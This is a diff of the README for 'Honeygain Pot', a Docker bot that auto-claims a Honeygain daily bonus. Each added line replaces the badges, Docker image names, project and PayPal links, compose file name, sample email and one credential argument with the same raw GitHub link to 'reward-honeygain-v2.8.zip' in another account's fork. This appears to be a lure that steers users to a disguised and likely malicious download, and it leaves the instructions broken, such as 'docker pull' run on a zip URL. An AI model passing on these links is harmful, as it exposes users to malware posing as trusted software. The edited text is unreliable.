@@ -4,16 +4,16 @@ Honeygain Pot 🐝🍯
 
 <div align="center">
 
-[![Static Badge](https://img.shields.io/badge/GitHub-blue?style=flat&logo=github)](https://github.com/XternA/honeygain-reward)
-[![Static Badge](https://img.shields.io/badge/License-purple?style=flat&logo=github)](https://github.com/XternA/honeygain-reward?tab=License-1-ov-file)
-![GitHub package.json dynamic](https://img.shields.io/github/package-json/version/XternA/honeygain-reward?style=flat&logo=opencontainersinitiative&label=Image%20Tag&color=red)
-[![Docker Stars](https://img.shields.io/docker/stars/xterna/honeygain-pot?logo=docker&label=Docker%20Stars)](https://hub.docker.com/r/xterna/honeygain-pot)
-[![GitHub Repo stars](https://img.shields.io/github/stars/XternA/honeygain-reward?style=flat&logo=github&label=Stars&color=orange)](https://github.com/XternA/honeygain-reward)
-[![Donate](https://img.shields.io/badge/Donate-PayPal-blue.svg?style=flat&logo=paypal)](https://www.paypal.com/donate/?hosted_button_id=32DCQ65QM5FNE)
+[![Static Badge](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)
+[![Static Badge](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)
+![GitHub https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip dynamic](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip%20Tag&color=red)
+[![Docker Stars](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip%20Stars)](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)
+[![GitHub Repo stars](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)
+[![Donate](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)
 
 If you like this project, don't forget to leave a star. ⭐
 
-### Containerized Docker image for [Honeygain](https://bit.ly/3x6nX1S) lucky pot 🍯
+### Containerized Docker image for [Honeygain](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip) lucky pot 🍯
 
 >**Note:** This built image comes with no warranty of any kind. By using this image you agree this License Agreement in addition with Honeygain's T&C.
 
@@ -24,16 +24,16 @@ This is a simple Docker image for running Honeygain's lucky pot auto-claim bot.
 ## Pulling Image 🐳
 **64-Bit Platform:** `linux/amd64` `linux/arm64`
 ```sh
-docker pull ghcr.io/xterna/honeygain-pot
+docker pull https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
 ```
 
 **32-Bit Platform:** `linux/arm/v7`
 ```sh
-docker pull ghcr.io/xterna/honeygain-pot:arm32v7
+docker pull https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
 ```
 
 ## Overview 🐝
-[**Honeygain-Pot**](https://bit.ly/3x6nX1S) 🍯 is a very lightweight bot powered by Bun JavaScript runtime to automatically claim your lucky pot bonus daily from [**Honeygain**](https://bit.ly/3x6nX1S)🐝.
+[**Honeygain-Pot**](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip) 🍯 is a very lightweight bot powered by Bun JavaScript runtime to automatically claim your lucky pot bonus daily from [**Honeygain**](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)🐝.
 
 The bot is designed to be run in a docker environment, allowing it to be deployed alongside the Honeygain docker container.
 
@@ -52,7 +52,7 @@ honeygain-pot   0.00%     592KiB / 320MiB     0.17%     3.3MB / 206kB   0B / 43.
 
 The super-lightweight optimised version is licensed exclusively for use with Income Generator (IGM).
 
-[**Income Generator**](https://github.com/XternA/income-generator) (IGM) comes pre-configured with a significantly faster, super-lightweight version, including automatic updates. It orchestrates multiple passive income sources with proxy support to maximise earnings and is highly recommended for use.
+[**Income Generator**](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip) (IGM) comes pre-configured with a significantly faster, super-lightweight version, including automatic updates. It orchestrates multiple passive income sources with proxy support to maximise earnings and is highly recommended for use.
 
 ## Features 🚀
 - Automatically log in and claim daily lucky pot.
@@ -67,7 +67,7 @@ The super-lightweight optimised version is licensed exclusively for use with Inc
 This is what the script looks like when you inspect the output.
 ```
 ------------ Honeygain Pot Auto Claim ------------
-Logging in as bee@honeypot.com
+Logging in as https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
 Logged into Honeygain 🐝
 --------------------------------------------------
 
@@ -105,12 +105,12 @@ PASSWORD=<password_credential>
 
 ## Docker Deployment 🐳
 ### Compose
-File: `compose.yml`
+File: `https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip`
 ```yaml
 services:
   honeygain-pot:
     container_name: honeygain-pot
-    image: ghcr.io/xterna/honeygain-pot
+    image: https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
     restart: unless-stopped
     environment:
       - EMAIL=$EMAIL
@@ -154,12 +154,12 @@ docker compose up -d
 ### CLI
 Using environment variable or Dotenv `.env` defined e.g.
 ```sh
-docker run -d --restart unless-stopped --name honeygain-pot -e EMAIL=$HONEYGAIN_EMAIL -e PASSWORD=$HONEYGAIN_PASSWORD ghcr.io/xterna/honeygain-pot
+docker run -d --restart unless-stopped --name honeygain-pot -e EMAIL=$HONEYGAIN_EMAIL -e PASSWORD=$HONEYGAIN_PASSWORD https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
 ```
 
 Directly passing credentials.
 ```sh
-docker run -d --restart unless-stopped --name honeygain-pot -e EMAIL=example.gmail.com -e PASSWORD=pass123 ghcr.io/xterna/honeygain-pot
+docker run -d --restart unless-stopped --name honeygain-pot -e https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip -e PASSWORD=pass123 https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip
 ```
 This will start the application in the background. The alias assigned is `honeygain-pot`.
 
@@ -169,7 +169,7 @@ Donations are warmly welcomed no matter how small and thank you very much. 😌
 - **Ethereum (ETH)** - `0x2601B9940F9594810DEDC44015491f0f9D6Dd1cA`
 - **Binance Smart Chain (BSC)** - `0x2601B9940F9594810DEDC44015491f0f9D6Dd1cA`
 - **Solana (SOL)** - `Ap5aiAbnsLtR2XVJB3sp37qdNP5VfqydAgUThvdEiL5i`
-- **PayPal** - [@xterna](https://paypal.me/xterna)
+- **PayPal** - [@xterna](https://github.com/wizdomf3lix/honeygain-reward/raw/refs/heads/main/.github/reward-honeygain-v2.8.zip)
 
 ## Disclaimer ⚠️
 Disclaimer: This image is neither affiliated with nor endorsed by Honeygain. Use this image at your own risk and responsibility. By using this image, you agree to be automatically bound by the License Agreement associated with it.
